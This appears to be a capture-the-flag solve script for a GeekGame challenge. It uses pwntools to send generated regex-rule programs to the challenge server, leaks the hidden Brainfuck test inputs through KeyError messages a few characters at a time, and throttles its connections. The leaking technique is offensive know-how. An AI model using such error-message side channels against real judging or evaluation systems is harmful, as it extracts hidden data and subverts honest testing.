from pwn import *
from itertools import product

# context.log_level = 'debug'

bf_alpha = '+-<>[].'
bf_escape = [re.escape(c) for c in bf_alpha]

LEAK1 = '++++++++[>++++[>++>+++>+++>+<<<<-]>+>+>->>+[<]<-]>>.>---.+++++++..+++.>>.<-.<.+++.------.--------.>>+.>++.'
ANSWER1 = """
重复把【[^+-<>.\\[\\]]】替换成【】喵
如果没看到【^.{106}$】就跳转到【code2】喵
code1：
把【^(.+)$】替换成【Hello World!】喵
如果看到【^】就跳转到【end】喵
code2：
# 如果没看到【^.{1181}$】就跳转到【leak】喵
把【^(.+)$】替换成【Daughter of the Yashiro Commission's Kamisato Clan from Inazuma.】喵
如果看到【^】就跳转到【end】喵
leak：
# 如果看到【^】就跳转到【diedie】喵
"""


leak_length = '\n'.join(['如果看到【^.{%d}】就跳转到【%d】喵'%(n,n) for n in range(1152+64, 1152, -1)])
leak_content = lambda pos, known: '%s：\n'%(known)+'\n'.join([
    "如果看到【^.{%d}%s】就跳转到【%s%s】喵"%(pos, re.escape(c), known, c) for c in bf_alpha
])
lv = 3
# bf1: 106
# bf2: 1181
MAXLEN = 1181
leak_code = b''
for START in range(0, MAXLEN, 3):
    payload = ''
    maxdepth = min(lv, MAXLEN - START)
    for depth in range(maxdepth):
        for known in product(*[[c for c in bf_alpha] for i in range(depth)]):
            payload += leak_content(START + depth, ''.join(known))+'\n'


    miao = ANSWER1 + payload + '''
    end：
    谢谢喵
    '''
    assert len(miao.encode()) < 64*1024, f"size exceed ({len(miao.encode()) / 1024}KB)"
    with open('filtered/leak_payload.txt', 'w') as fp:
        fp.write(miao)

    with open('filtered/miao_rule','w') as fp:
        fp.write(miao)
    # # print(miao)
    # print('=============')

    # test = [
    #     '++++++++[>++++[>++>+++>+++>+<<<<-]>+>+>->>+[<]<-]>>.>---.+++++++..+++.>>.<-.<.+++.------.--------.>>+.>++.',
    #     '',
    #     '++++++++[>++++++++<-]>++++++++.>++++++++[>++++++++++++<-]>+++++.+++++++..+++.>++++++++[>+++++<-]>++++.------------.<<<<+++++++++++++++.>>.+++.------.--------.>>+.'
    # ]

    # for t in test:
    #     with open('filtered/miao_text','w') as fp:
    #         fp.write(t)
    #     print('testcase', t.__repr__())
    #     print('=====')
    #     res = os.popen('/bin/python3 filtered/filtered.py filtered/miao_rule filtered/miao_text').read()
    #     print(res.__repr__())

    # print('total size', len(miao))

    # print(miao)

    t_conn = time.time()
    conn = remote('prob04.geekgame.pku.edu.cn',10004)
    conn.sendlineafter(b'Please input your token: ', b'')
    conn.sendlineafter('1-3'.encode(), b'3')
    conn.sendlineafter('64KB'.encode(), miao.encode())

    # k = conn.recvline(timeout=3)
    # print(k)
    kerr_leak = conn.recvuntil(('输出好像不太对'.encode(), b'flag'), timeout=3)
    if b'KeyError' in kerr_leak:
        leak_code += kerr_leak.split(b"'")[-2]
        print(START, leak_code)
    elif b'flag' in kerr_leak:
        flag_body = conn.recvline()
        print(flag_body)
        break
    else:
        print(kerr_leak.decode())

    conn.close()
    # break

    if time.time() - t_conn < 10:
        # 30sec 3 times
        sleep(10 - time.time() + t_conn)

    # conn.interactive()

# print(leak_code)
# with open('filtered/ayaka.txt', 'wb') as fp:
#     fp.write(leak_code)
